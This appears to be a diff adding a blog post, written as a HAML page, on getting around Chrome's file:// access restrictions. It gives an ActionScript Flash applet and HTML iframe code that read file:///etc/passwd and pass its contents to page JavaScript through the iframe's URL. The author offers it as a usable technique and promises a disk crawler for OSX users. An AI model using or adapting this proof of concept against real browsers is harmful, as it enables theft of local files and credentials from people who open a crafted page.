@@ -1,0 +1,31 @@
+%h2 Bypass Chrome's file access restricions for file:// URLs
+%article
+  :markdown
+    HTML documents served under the file:// have privileges that vary from browser to browser. Generally, such documents will have the ability to read local files. However, on Firefox the "scope" of files you can read is limited to the file's directory. On Chrome, you can't read anything.
+    
+    - Chrome: No file access
+    - Firefox: same-directory file access
+    - Safari: Full file access (wtf!)
+    - IE: ??
+    
+    Let's see how we can bypass Chrome's restrictions. By running a Flash applet compiled in "local-file" mode, we can fetch & parse local files all day long. However, when the applet is in "local-file" mode, it is not able to communicate with Javascript or send requests to external domains. But on Chrome this is easy to bypass:
+    
+    `// in HTML
+    <iframe src='about:blank' name='comm'>
+    <embed src='bad.swf'></embed>
+    // in flash SWF file        
+    var loader:URLLoader = new URLLoader();
+    loader.dataFormat = URLLoaderDataFormat.TEXT;
+    loader.addEventListener(Event.COMPLETE, completeHandler);
+    loader.load(new URLRequest('file:///etc/passwd'));
+    function completeHandler(event:Event):void {
+      var loader2:URLLoader = URLLoader(event.target);
+      // it would be trivial to write a real alphanumeric encoder, but
+      //   for now we'll just steal the A-Za-z data in the file.
+      var str = loader2.data.replace(/[^\w]/g, '');
+      navigateToURL(new URLRequest("about:"+str+"@blank"), "comm");
+    }`
+    
+    Then just query the iframe's src attribute: `alert(comm.src)` and you can find the data sitting happily before the colon.
+    
+    Note: Soon I'll show how to crawl an OSX user's disk using this technique.
